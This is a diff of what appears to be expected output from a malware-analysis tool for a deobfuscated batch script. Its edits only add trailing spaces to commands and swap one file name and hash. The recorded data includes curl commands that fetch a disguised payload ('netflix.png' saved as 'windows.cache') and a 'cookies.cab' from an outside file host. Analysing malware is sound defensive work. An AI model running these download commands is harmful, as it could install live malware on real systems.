@@ -367,7 +367,7 @@
             "URL": "https://file.lucasvl.nl/f/T2VHb19/netflix.png"
           },
           {
-            "Command": "curl -s https://file.lucasvl.nl/f/7Hr9o4w/cookies.cab -o Cookies.cab",
+            "Command": "curl -s https://file.lucasvl.nl/f/7Hr9o4w/cookies.cab -o Cookies.cab ",
             "Destination": "Cookies.cab",
             "URL": "https://file.lucasvl.nl/f/7Hr9o4w/cookies.cab"
           }
@@ -396,7 +396,7 @@
             "process": {
               "command_line": [
                 "curl -s https://file.lucasvl.nl/f/T2VHb19/netflix.png -o C:\\Users\\puncher\\AppData\\Local\\temp\\windows.cache ",
-                "curl -s https://file.lucasvl.nl/f/7Hr9o4w/cookies.cab -o Cookies.cab"
+                "curl -s https://file.lucasvl.nl/f/7Hr9o4w/cookies.cab -o Cookies.cab "
               ]
             }
           },
@@ -560,8 +560,8 @@
         "sha256": "35f7c387cbeb502344ba11a4cbc29bcda94a505abaac9bbc220c905eefdf6eea"
       },
       {
-        "name": "5308472d48_deobfuscated.bat",
-        "sha256": "5308472d48488c93ed13b8d26a9c21238c263125eabcbae10620e45bdc72a67f"
+        "name": "56132485d3_deobfuscated.bat",
+        "sha256": "56132485d3be1fa7c83224fe4b0404bb30204abe7efe1c8317f7c3e94ad638e0"
       }
     ],
     "supplementary": []
@@ -605,7 +605,7 @@
         {
           "heur_id": 5,
           "signatures": [],
-          "value": "curl -s https://file.lucasvl.nl/f/7Hr9o4w/cookies.cab -o Cookies.cab"
+          "value": "curl -s https://file.lucasvl.nl/f/7Hr9o4w/cookies.cab -o Cookies.cab "
         },
         {
           "heur_id": 5,
